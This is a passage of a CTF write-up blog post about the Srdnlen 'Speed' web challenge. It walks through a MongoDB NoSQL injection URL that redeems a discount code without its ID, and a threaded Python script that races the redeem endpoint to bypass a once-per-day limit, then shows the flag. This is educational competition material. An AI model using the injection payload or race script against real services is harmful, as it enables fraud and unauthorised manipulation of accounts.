</pre></td></tr></tbody></table></code></div></div>
<p>The discount code ID doesn’t contain lowercase chars, and is 12 chars long, so it can’t be equal to <code class="language-plaintext highlighter-rouge">a</code></p>

<p>You can learn more on how to send JSON objects through the url <a href="/posts/uoftctf2025-prismatic/#identifying-vulnerabilities">here</a>, it’s relatively easy. I’ll use this url:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">http://speed.challs.srdnlen.it:8082/redeem?discountCode[$ne]=a</code></li>
</ul>

<p><a href="/assets/img/writeups/srdnlen/mongodb_nosql_injection.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/srdnlen/mongodb_nosql_injection.png" alt="image"  loading="lazy"></a>
<em>We now have a way to redeem a discount code without knowing its ID !</em></p>

<h1 id="exploitation">Exploitation</h1>

<h3 id="exploiting-the-vulnerability"><span class="me-2">Exploiting the vulnerability</span><a href="#exploiting-the-vulnerability" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>If we try to redeem it one more time:
<a href="/assets/img/writeups/srdnlen/no_redeem_two.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/srdnlen/no_redeem_two.png" alt="image"  loading="lazy"></a>
<em>We can’t redeem the discount code a second time!</em></p>

<p>Looking at this code from <a href="#appjs">app.js</a>, we confirm that there is only <code class="language-plaintext highlighter-rouge">ONE</code> discount code generated by the application, with a value of <code class="language-plaintext highlighter-rouge">20</code>:</p>
<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">discountCodes</span> <span class="o">=</span> <span class="p">[</span>
    <span class="p">{</span> <span class="na">discountCode</span><span class="p">:</span> <span class="nf">generateDiscountCode</span><span class="p">(),</span> <span class="na">value</span><span class="p">:</span> <span class="mi">20</span> <span class="p">}</span>
<span class="p">];</span>
</pre></td></tr></tbody></table></code></div></div>
<p>So we absolutely need to find a way to redeem a token multiple times <em>(at least 3 times to buy the flag)</em>.</p>

<p>If you look closely at the <code class="language-plaintext highlighter-rouge">/redeem</code> route code, you’ll notice another strange thing:</p>
<div class="language-javascript highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">today</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Date</span><span class="p">();</span>
<span class="kd">const</span> <span class="nx">lastRedemption</span> <span class="o">=</span> <span class="nx">user</span><span class="p">.</span><span class="nx">lastVoucherRedemption</span><span class="p">;</span>

<span class="k">if </span><span class="p">(</span><span class="nx">lastRedemption</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">isSameDay</span> <span class="o">=</span> <span class="nx">lastRedemption</span><span class="p">.</span><span class="nf">getFullYear</span><span class="p">()</span> <span class="o">===</span> <span class="nx">today</span><span class="p">.</span><span class="nf">getFullYear</span><span class="p">()</span> <span class="o">&amp;&amp;</span>
                        <span class="nx">lastRedemption</span><span class="p">.</span><span class="nf">getMonth</span><span class="p">()</span> <span class="o">===</span> <span class="nx">today</span><span class="p">.</span><span class="nf">getMonth</span><span class="p">()</span> <span class="o">&amp;&amp;</span>
                        <span class="nx">lastRedemption</span><span class="p">.</span><span class="nf">getDate</span><span class="p">()</span> <span class="o">===</span> <span class="nx">today</span><span class="p">.</span><span class="nf">getDate</span><span class="p">();</span>
    <span class="k">if </span><span class="p">(</span><span class="nx">isSameDay</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">({</span><span class="na">success</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">message</span><span class="p">:</span> <span class="dl">'</span><span class="s1">You have already redeemed your gift card today!</span><span class="dl">'</span> <span class="p">});</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="c1">// Apply the gift card value to the user's balance</span>
<span class="kd">const</span> <span class="p">{</span> <span class="nx">Balance</span> <span class="p">}</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">User</span><span class="p">.</span><span class="nf">findById</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">userId</span><span class="p">).</span><span class="nf">select</span><span class="p">(</span><span class="dl">'</span><span class="s1">Balance</span><span class="dl">'</span><span class="p">);</span>
<span class="nx">user</span><span class="p">.</span><span class="nx">Balance</span> <span class="o">=</span> <span class="nx">Balance</span> <span class="o">+</span> <span class="nx">discount</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
<span class="c1">// Introduce a slight delay to ensure proper logging of the transaction </span>
<span class="c1">// and prevent potential database write collisions in high-load scenarios.</span>
<span class="k">new</span> <span class="nc">Promise</span><span class="p">(</span><span class="nx">resolve</span> <span class="o">=&gt;</span> <span class="nf">setTimeout</span><span class="p">(</span><span class="nx">resolve</span><span class="p">,</span> <span class="nx">delay</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">));</span>
<span class="nx">user</span><span class="p">.</span><span class="nx">lastVoucherRedemption</span> <span class="o">=</span> <span class="nx">today</span><span class="p">;</span>
<span class="k">await</span> <span class="nx">user</span><span class="p">.</span><span class="nf">save</span><span class="p">();</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The backend waits <code class="language-plaintext highlighter-rouge">delay * 1000</code> <em>(= 1,5 * 1000)</em> milliseconds before saving the <code class="language-plaintext highlighter-rouge">lastVoucherRedemption</code> date of the current user. 
So, maybe we could bypass the <code class="language-plaintext highlighter-rouge">if (isSameDay)</code> check by spamming the server quickly, so that the backend doesn’t have time to update the <code class="language-plaintext highlighter-rouge">lastVoucherRedemption</code> date of the user in the database.</p>

<h3 id="scripting"><span class="me-2">Scripting</span><a href="#scripting" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>I wrote a simple python exploit script that uses <code class="language-plaintext highlighter-rouge">Threads</code> to send requests in parallel:</p>

<div file="exploit.py" class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="exploit.py"><i class="far fa-file-code fa-fw"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">from</span> <span class="n">threading</span> <span class="kn">import</span> <span class="n">Thread</span>
<span class="kn">from</span> <span class="n">sys</span> <span class="kn">import</span> <span class="n">argv</span>
<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="n">log</span>
<span class="kn">import</span> <span class="n">requests</span>

<span class="c1"># Ensure we have the user's JWT
</span><span class="nf">if</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">):</span>
    <span class="n">log</span><span class="p">.</span><span class="nf">critical</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Usage: </span><span class="si">{</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> JWT_TOKEN</span><span class="sh">"</span><span class="p">)</span>

<span class="c1"># The URL with the NoSQL injection
</span><span class="n">url</span> <span class="o">=</span> <span class="sh">'</span><span class="s">http://speed.challs.srdnlen.it:8082/redeem?discountCode[$ne]=a</span><span class="sh">'</span>
<span class="c1"># Headers to authenticate with the server
</span><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="sh">"</span><span class="s">Cookie</span><span class="sh">"</span><span class="p">:</span> <span class="sa">f</span><span class="sh">"</span><span class="s">jwt=</span><span class="si">{</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="sh">"</span>
<span class="p">}</span>

<span class="c1"># Redeem the voucher and display the response
</span><span class="k">def</span> <span class="nf">send_request</span><span class="p">():</span>
	<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
	<span class="nf">if</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="nf">json</span><span class="p">()[</span><span class="sh">"</span><span class="s">success</span><span class="sh">"</span><span class="p">]</span> <span class="o">==</span> <span class="bp">False</span><span class="p">):</span>
		<span class="n">log</span><span class="p">.</span><span class="nf">failure</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>

<span class="c1"># Create 20 threads
</span><span class="n">threads</span> <span class="o">=</span> <span class="p">[</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">send_request</span><span class="p">,</span> <span class="n">daemon</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">20</span><span class="p">)]</span>

<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">Targeting </span><span class="sh">"</span> <span class="o">+</span> <span class="n">url</span><span class="p">)</span>
<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">"</span><span class="s">Sending 20 requests</span><span class="sh">"</span><span class="p">)</span>

<span class="c1"># Redeem the voucher 20 times at the same time
</span><span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">threads</span><span class="p">:</span>
    <span class="n">t</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
<span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">threads</span><span class="p">:</span>
    <span class="n">t</span><span class="p">.</span><span class="nf">join</span><span class="p">()</span>

</pre></td></tr></tbody></table></code></div></div>

<p>As you may have noticed, see the scripts requires a <code class="language-plaintext highlighter-rouge">JWT</code>, so that the server can authenticate the user and give him the credits. 
To get one, go to the register page, register, then <code class="language-plaintext highlighter-rouge">right click -&gt; inspect -&gt; storage</code>:</p>

<p><a href="/assets/img/writeups/srdnlen/get_jwt.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/srdnlen/get_jwt.png" alt="image"  loading="lazy"></a>
<em>You can grab the JWT from here</em></p>

<p>Then you can launch the script with the JWT:
<a href="/assets/img/writeups/srdnlen/exploiting_race_condition.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/srdnlen/exploiting_race_condition.png" alt="image"  loading="lazy"></a>
<em>We succesfully exploited the race condition</em></p>

<p>The output is quite weird … but eh … We got our 60 credits, so …</p>

<h3 id="getting-th-flag"><span class="me-2">Getting th flag</span><a href="#getting-th-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>To get the flag, we just have to buy it. To do so go on the store page, and buy the product number 4:</p>

<p><a href="/assets/img/writeups/srdnlen/store.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/srdnlen/store.png" alt="image"  loading="lazy"></a>
<a href="/assets/img/writeups/srdnlen/bought.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/srdnlen/bought.png" alt="image"  loading="lazy"></a></p>

<p>No we get back on the home page:
<a href="/assets/img/writeups/srdnlen/gotflag.png" class="popup img-link radius-shadow shimmer"><img src="/assets/img/writeups/srdnlen/gotflag.png" alt="image"  loading="lazy"></a>
<em>And we get the flag !</em></p>

<div file="flag.txt" class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="flag.txt"><i class="far fa-file-code fa-fw"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>srdnlen{6peed_1s_My_0nly_Competition}
</pre></td></tr></tbody></table></code></div></div>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/writeups/">Writeups</a>,
          <a href="/categories/ctftime2025/">CTFTime2025</a>,
          <a href="/categories/srdnlen/">Srdnlen</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/writeups/"
            class="post-tag no-text-decoration"
          >writeups</a>
        
          <a
            href="/tags/web/"
            class="post-tag no-text-decoration"
          >web</a>
        
          <a
            href="/tags/express/"
            class="post-tag no-text-decoration"
          >express</a>
        
          <a
            href="/tags/nosql-injection/"
            class="post-tag no-text-decoration"
          >nosql-injection</a>
        
          <a
            href="/tags/mongodb/"
            class="post-tag no-text-decoration"
          >mongodb</a>
        
          <a
            href="/tags/race-condition/"
            class="post-tag no-text-decoration"
          >race-condition</a>
        
          <a
            href="/tags/python-scripting/"
            class="post-tag no-text-decoration"
          >python-scripting</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=Srdnlen%20-%20Speed%20-%20NullBrunk&url=https%3A%2F%2Fgithub.com%2FNullBrunk%2Fposts%2FSrdnlenCTF2025-racecondition-copy%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=Srdnlen%20-%20Speed%20-%20NullBrunk&u=https%3A%2F%2Fgithub.com%2FNullBrunk%2Fposts%2FSrdnlenCTF2025-racecondition-copy%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=https%3A%2F%2Fgithub.com%2FNullBrunk%2Fposts%2FSrdnlenCTF2025-racecondition-copy%2F&text=Srdnlen%20-%20Speed%20-%20NullBrunk" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>

            
          </main>

         
            <!-- panel -->
            <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted">
              <div class="access">
                

  <section id="toc-wrapper">
    <h2 class="panel-heading no-border">Event</h2>
    <ul class="content list-unstyled no-border ps-0 pb-1 ms-1 mt-2 toc-list ">
    
      <li class="toc-list-item">
        <a class="toc-link node-name--H2 img-link fw-600 blue-sidebar"> <i class="fa-solid fa-ranking-star mr-11-px"></i> 167 / 1577  </a>
      </li>

      <li class="toc-list-item no-border">
        <a class="toc-link node-name--H2 img-link fw-600" href="https://ctftime.org/event/2576" target="_blank"> <i class="fa-solid fa-link mr-11-px"></i>Link</a>
      </li>

    </ul>
  </section>





                

  <section>
      <h2 class="panel-heading no-border">Tags</h2>

      <nav id="toc">
        <div class="d-flex flex-wrap mt-3 mb-1 me-3">
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/writeups/">writeups</a>
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/web/">web</a>
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/express/">express</a>
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/nosql-injection/">nosql-injection</a>
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/mongodb/">mongodb</a>
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/race-condition/">race-condition</a>
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/python-scripting/">python-scripting</a>
          
        </div>
      </nav>
  </section>


              </div>

              
                
                






  <div class="toc-border-cover z-3"></div>
  <section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4">
    <h2 class="panel-heading ps-3 pb-1 mb-0">Contents</h2>
    <nav id="toc"></nav>
  </section>

              
            </aside>
          
        </div>

        <div class="row">
          <!-- tail -->

          
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->















  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
    
  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/uoftctf2025-prismatic/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1736611200"
  data-df="ll"
  
>
  Jan 11, 2025
</time>

              <h4 class="pt-0 my-2">UofTCTF - Prismatic Blogs</h4>
              <div class="text-muted">
                <p>Enumeration
    
      Reading source code
      Interesting points
      Identifying vulnerabilities
    
  
  Exploitation
    
      Exploiting the vulnerability
      Scripting (case unsensitiv...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/hackday-2025-finest/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1737806400"
  data-df="ll"
  
>
  Jan 25, 2025
</time>

              <h4 class="pt-0 my-2">HackDay - Finest</h4>
              <div class="text-muted">
                <p>Introduction
    
      Description
    
  
  Enumeration
    
      Reading Source Code
      JWY Secret Key
      SQL injection
    
  
  Exploitation
    
      Understanding the JWT
      Scrip...</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/pragyan-deathdaycard/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1739030400"
  data-df="ll"
  
>
  Feb  8, 2025
</time>

              <h4 class="pt-0 my-2">Pragyan - Deathday Card</h4>
              <div class="text-muted">
                <p>Introduction
    
      Pragyan CTF 2025
      Description
    
  
  Enumeration
    
      Reading Source Code
      Identifying vulnerabilities
    
  
  Exploitation
    
      Verifying SSTI
  ...</p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            

          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
  <div class="col-11 content">
    <div id="search-hints">
      

  <section>
      <h2 class="panel-heading no-border">Tags</h2>

      <nav id="toc">
        <div class="d-flex flex-wrap mt-3 mb-1 me-3">
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/hacking-tools/">hacking-tools</a>
          
            
            <a class="post-tag btn btn-outline-primary" href="/tags/poc/">poc</a>
          
        </div>
      </nav>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- Embedded scripts -->

    
      
      <!-- The comments switcher -->


    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  
  document.addEventListener('DOMContentLoaded', () => {
    SimpleJekyllSearch({
      searchInput: document.getElementById('search-input'),
      resultsContainer: document.getElementById('search-results'),
      json: '/assets/js/data/search.json',
      searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
      noResultsText: '<p class="mt-5">Oops! No results found.</p>',
      templateMiddleware: function(prop, value, template) {
        if (prop === 'categories') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
          }
        }

        if (prop === 'tags') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
          }
        }
      }
    });
  });
</script>

  </body>
</html>

